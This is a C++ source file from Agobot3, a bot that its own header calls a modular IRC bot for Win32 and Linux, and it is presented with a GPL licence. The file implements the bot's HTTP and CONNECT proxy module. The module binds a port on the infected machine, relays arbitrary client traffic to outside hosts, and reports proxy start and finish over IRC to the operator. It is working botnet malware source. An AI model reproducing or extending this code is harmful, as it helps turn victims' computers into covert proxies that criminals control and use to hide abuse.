/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "redir_http.h"
#include "mainctrl.h"
#include "utility.h"

//#ifdef _DEBUG
//#define MEMCHK _CrtCheckMemory
//#else
//#define MEMCHK NULL
//#endif // _DEBUG


CRedirectHTTP_Thread::CRedirectHTTP_Thread() { m_szType="CRedirectHTTP_Thread"; m_sRedirectName.Assign("redirhttp"); }

void CRedirectHTTP_Thread::StartRedirect()
{	m_iLastPort=0;
	m_sServerSocket=SOCKET_ERROR; bool bServerKeepAlive=false;
	int iErr=1; bool bFinished=false; while(!bFinished && g_pMainCtrl->m_bRunning) {
		url uURL; char szBuffer[MAX_PATH]; bool bGet=false; bool bPost=false;
		bServerKeepAlive=false; m_bKeepAlive=false; CString sReqBuf;

		// Receive the proxy request
		if(!m_sClientSocket.RecvLineIRC(szBuffer, MAX_PATH)) { bFinished=true; break; }
		CString sBuffer(szBuffer);

		if(!sBuffer.Compare("")) continue;

		if(!sBuffer.Token(0, " ").CompareNoCase("GET")) { // GET method
			bGet=true;
			// Parse the url
			if(!ParseURL(sBuffer.Token(1, " ").CStr(), &uURL)) { bFinished=true; break; }
			// Fail if the protocol isn't http
			if(uURL.sProto.Compare("http")) { bFinished=true; break; }
		} else if(!sBuffer.Token(0, " ").CompareNoCase("CONNECT")) { // CONNECT method
			bGet=false;
			// Parse the host
			uURL.sProto.Assign("connect");
			uURL.sReq.Assign("");
			uURL.sHost.Assign(sBuffer.Token(1, " ").Token(0, ":"));
			if(!sBuffer.Token(1, " ").Token(1, ":").CStr()) { bFinished=true; break; }
			uURL.iPort=atoi(sBuffer.Token(1, " ").Token(1, ":").CStr());
			if(!uURL.iPort) uURL.iPort=80;
		} else if(!sBuffer.Token(0, " ").CompareNoCase("POST")) { // POST method
			bGet=true; bPost=true;
			// Parse the url
			if(!ParseURL(sBuffer.Token(1, " ").CStr(), &uURL)) { bFinished=true; break; }
			// Fail if the protocol isn't http
			if(uURL.sProto.Compare("http")) { bFinished=true; break; }
		}

		// Get the rest of the request
		CString sMethod(sBuffer.Token(0, " ")); if(!sMethod.Compare("")) { bFinished=true; break; }
		CString sHTTPVer(sBuffer.Token(2, " ")); if(!sHTTPVer.Compare("")) { bFinished=true; break; }
		CString sOldHost(uURL.sHost);

		if(uURL.sHost.Compare(m_sLastHost) || uURL.iPort!=m_iLastPort) m_sServerSocket.Disconnect();
		
		m_sLastHost.Assign(uURL.sHost); m_iLastPort=uURL.iPort;

#ifdef DBGCONSOLE
		if(bGet)
			g_pMainCtrl->m_cConsDbg.Log(5, "CRedirectHTTP(0x%8.8Xh): %s %s %s...\n", m_pRedirHTTP, sMethod.CStr(), uURL.sReq.CStr(), sHTTPVer.CStr());
		else
			g_pMainCtrl->m_cConsDbg.Log(5, "CRedirectHTTP(0x%8.8Xh): %s %s:%d %s...\n", m_pRedirHTTP, sMethod.CStr(), uURL.sHost.CStr(), uURL.iPort, sHTTPVer.CStr());
#endif

		char szBuf[1024]; memset(szBuf, 0, sizeof(szBuf));
		char szHeaders[4096*4]; memset(szHeaders, 0, sizeof(szHeaders));
		char szRecvBuf[4096]; strcpy(szRecvBuf, "bla bla bla");
		while(strcmp(szRecvBuf, "\r\n") && strcmp(szRecvBuf, "")) {
			if(!m_sClientSocket.RecvLineIRC(szRecvBuf, sizeof(szRecvBuf)))
			{	m_sClientSocket.Disconnect(); return; }
			strncat(szHeaders, szRecvBuf, sizeof(szHeaders));
			strncat(szHeaders, "\r\n", sizeof(szHeaders));
		}

		// Check if theres a proxy keep-alive somewhere
		char *szProxyKeepAlive=strstr(szHeaders, "Proxy-Connection:");
		if(!szProxyKeepAlive) szProxyKeepAlive=strstr(szHeaders, "proxy-connection:");
		if(!szProxyKeepAlive) szProxyKeepAlive=strstr(szHeaders, "Proxy-connection:");
		if(szProxyKeepAlive) szProxyKeepAlive=strstr(szProxyKeepAlive, ":")+1;
		if(szProxyKeepAlive) {
			while(*szProxyKeepAlive==' ') szProxyKeepAlive++;	// Skip leading whitespaces
			if(stricmp(szProxyKeepAlive, "Keep-Alive")) 
				m_bKeepAlive=true;								// Found keep-alive
			else
				m_bKeepAlive=false;								// Found close (or sth strange)
		} else m_bKeepAlive=false;								// Default to close

		// Check if theres a content length
		char *szContentLength=strstr(szHeaders, "Content-Length:");
		if(!szContentLength) szContentLength=strstr(szHeaders, "content-length:");
		if(!szContentLength) szContentLength=strstr(szHeaders, "Content-length:");
		if(szContentLength) szContentLength=strstr(szContentLength, ":")+1;
		int iPostDataLength=0;
		if(szContentLength) {
			while(*szContentLength==' ') szContentLength++;	// Skip leading whitespaces
			iPostDataLength=atoi(szContentLength);
		}

		char *szPostData=NULL;

		if(bPost && iPostDataLength) {
			szPostData=new char[iPostDataLength]; int iPostDataRead=0; while((iPostDataLength-iPostDataRead)>0) {
				int iLen=m_sClientSocket.Recv(szPostData+iPostDataRead, iPostDataLength-iPostDataRead);
				if(iLen<1) { bFinished=true; break; }
				iPostDataRead+=iLen;
			}
		}

		if(!m_sServerSocket.IsConnected()) {
			// Connect to the server
			if(!m_sServerSocket.Connect(uURL.sHost.CStr(), uURL.iPort)) // Connect failed, exit
			{	
#ifdef DBGCONSOLE
				g_pMainCtrl->m_cConsDbg.Log(5, "CRedirectHTTP(0x%8.8Xh): Cannot connect to %s:%d (%s)...\n", m_pRedirHTTP, uURL.sHost.CStr(), uURL.iPort, uURL.sReq.CStr());
#endif
				sReqBuf.Format(	"HTTP/1.0 503 Service Unavailable\r\n"
								"Server: httpproxy\r\n"
								"Content-Type: text/html\r\n"
								"Proxy-Connection: close\r\n"
								"\r\n\r\n"
								"Connection to %s:%d failed!\n",
								uURL.sHost.CStr(), uURL.iPort);

				m_sClientSocket.Write(sReqBuf.CStr(), sReqBuf.GetLength());

				m_sClientSocket.Disconnect(); m_sServerSocket.Disconnect();

				return; }
		}

		int iLen; fd_set fd;

		if(bGet) {
			if(m_bKeepAlive)
				sReqBuf.Format("%s %s %s\r\nConnection: keep-alive\r\n%s", sMethod.CStr(), uURL.sReq.CStr(), sHTTPVer.CStr(), szHeaders);
			else
				sReqBuf.Format("%s %s %s\r\nConnection: close\r\n%s", sMethod.CStr(), uURL.sReq.CStr(), sHTTPVer.CStr(), szHeaders);
		
			if(!m_sServerSocket.Write(sReqBuf.CStr(), sReqBuf.GetLength()))
			{	m_sClientSocket.Disconnect(); m_sServerSocket.Disconnect(); return; }

			if(bPost && iPostDataLength) {
				m_sServerSocket.Write(szPostData, iPostDataLength);
			}

			if(!m_sServerSocket.RecvLineIRC(szHeaders, sizeof(szHeaders))) { bFinished=true; break; }
			strncat(szHeaders, "\r\n", sizeof(szHeaders));
			m_sClientSocket.Write(szHeaders, strlen(szHeaders));
			
			int iContentLength=0; char *szTemp="bla"; bool bChunked=false, bKnowLength=false;
			while(strcmp(szHeaders, "\r\n") && strcmp(szHeaders, "")) {
				if(!m_sServerSocket.RecvLineIRC(szHeaders, sizeof(szHeaders))) { bFinished=true; break; }
				// Find Content-Length
				CString sBuf(szHeaders);
				if(!sBuf.Token(0, " ").CompareNoCase("Content-Length:")) {
					bKnowLength=true;
					iContentLength=atoi(sBuf.Token(1, " ").CStr());
				}
				if(!sBuf.Token(0, " ").CompareNoCase("Transfer-Encoding:")) {
					if(!sBuf.Token(1, " ").CompareNoCase("chunked"))
						bChunked=true;
					else
						bChunked=false;
				}
				if(!sBuf.Token(0, " ").CompareNoCase("Connection:")) {
					if(!sBuf.Token(1, " ").CompareNoCase("Keep-Alive"))
						bServerKeepAlive=true;
					else
						bServerKeepAlive=false;
				}

				if(!sBuf.Token(0, " ").CompareNoCase("Proxy-Connection:")) {
					if(!sBuf.Token(1, " ").CompareNoCase("Keep-Alive"))
						m_bKeepAlive=true;
					else
						m_bKeepAlive=false;
				}

				if(strcmp(szHeaders, "\r\n") && strcmp(szHeaders, "")) {
					strcat(szHeaders, "\r\n"); m_sClientSocket.Write(szHeaders, strlen(szHeaders));
				}
			}

			if(bServerKeepAlive)
			{	char *lszTemp="Connection: Keep-Alive\r\n";
				m_sClientSocket.Write(lszTemp, strlen(lszTemp)); }
			else
			{	char *lszTemp="Connection: Close\r\n";
				m_sClientSocket.Write(lszTemp, strlen(lszTemp)); }

			strcpy(szBuf, "\r\n"); m_sClientSocket.Write(szBuf, strlen(szBuf));

			if(bKnowLength) {
				if(iContentLength) {
					int iContentRead=0;

					while(iContentRead<iContentLength && (iContentLength-iContentRead)>sizeof(szBuf))
					{	m_sServerSocket.Recv(szBuf, sizeof(szBuf), &iLen);
						if(iLen<1 || iLen==SOCKET_ERROR) break;
						if(!m_sClientSocket.Write(szBuf, iLen)) break;
						iContentRead+=iLen;
					}

					int iLeft;
					while(iContentLength-iContentRead) {
						iLeft=iContentLength-iContentRead;
						m_sServerSocket.Recv(szBuf, iLeft, &iLen);
						if(iLen<1 || iLen==SOCKET_ERROR) break;
						if(!m_sClientSocket.Write(szBuf, iLen)) break;
						iContentRead+=iLen;
					}
				}
			} else {
				while(true)
				{	m_sServerSocket.Recv(szBuf, sizeof(szBuf), &iLen);
					if(iLen<1 || iLen==SOCKET_ERROR)
						break;
					if(!m_sClientSocket.Write(szBuf, iLen))
						break;
				}
			}
		} else {
			bServerKeepAlive=false; m_bKeepAlive=false;
			sReqBuf.Format("HTTP/1.0 200 Connection established\r\n\r\n");
			m_sClientSocket.Write(sReqBuf.CStr(), sReqBuf.GetLength(), &iErr);
			if(!iErr || iErr==SOCKET_ERROR) { m_sClientSocket.Disconnect(); m_sServerSocket.Disconnect(); return; }
			fd_set fd; while(true) {
				FD_ZERO(&fd);
				FD_SET(m_sClientSocket.GetSocket(), &fd);
				FD_SET(m_sServerSocket.GetSocket(), &fd);
				memset(szBuf, 0, sizeof(szBuf)); select(0, &fd, NULL, NULL, NULL);
				
				if(FD_ISSET(m_sClientSocket.GetSocket(), &fd)) {
					m_sClientSocket.Recv(szBuf, sizeof(szBuf), &iLen);
					if(iLen<1) break; if(!m_sServerSocket.Write(szBuf, iLen)) break; }

				if(FD_ISSET(m_sServerSocket.GetSocket(), &fd)) {
					m_sServerSocket.Recv(szBuf, sizeof(szBuf), &iLen);
					if(iLen<1) break; if(!m_sClientSocket.Write(szBuf, iLen)) break; }

				Sleep(5);
			}
		}

		if(!m_bKeepAlive || !bServerKeepAlive) {
			m_sClientSocket.Disconnect(); bFinished=true; }
		if(!bServerKeepAlive || !m_bKeepAlive) {
			m_sServerSocket.Disconnect(); }
		if(bPost && iPostDataLength) delete [] szPostData;
	}
	if(m_bKeepAlive) {
		m_sClientSocket.Disconnect(); }
	if(bServerKeepAlive) {
		m_sServerSocket.Disconnect(); }
}

CRedirectHTTP::CRedirectHTTP() { m_szType="CRedirectHTTP"; m_sRedirectName.Assign("redirhttp"); }

void CRedirectHTTP::HTTPProxy() {
	while(!m_sListenSocket.Bind(m_iLocalPort) && m_pRedirect->m_bRedirecting) Sleep(1000);

	while(m_pRedirect->m_bRedirecting && g_pMainCtrl->m_bRunning) {
		CSocket sClientSocket(true);
		if(!m_sListenSocket.Accept(sClientSocket)) break;

		CRedirectHTTP_Thread *pTemp=new CRedirectHTTP_Thread;
		pTemp->m_pRedirect=m_pRedirect; pTemp->m_pRedirHTTP=this;
		pTemp->m_iLocalPort=m_iLocalPort; pTemp->m_sClientSocket=sClientSocket;
		pTemp->m_sReplyTo.Assign(m_sReplyTo); pTemp->m_bSilent=m_bSilent; pTemp->m_bNotice=m_bNotice;
		pTemp->Start(true);
	}

	m_sListenSocket.Disconnect(); }

void CRedirectHTTP::StartRedirect()
{	if(m_bUseSSL)
		g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: starting proxy on port %d, using ssl.", \
									  m_sRedirectName.CStr(), m_iLocalPort);
	else
		g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: starting proxy on port %d.", \
									  m_sRedirectName.CStr(), m_iLocalPort);

	HTTPProxy();
	
	g_pMainCtrl->m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: finished proxy on port %d.", \
								  m_sRedirectName.CStr(), m_iLocalPort); }
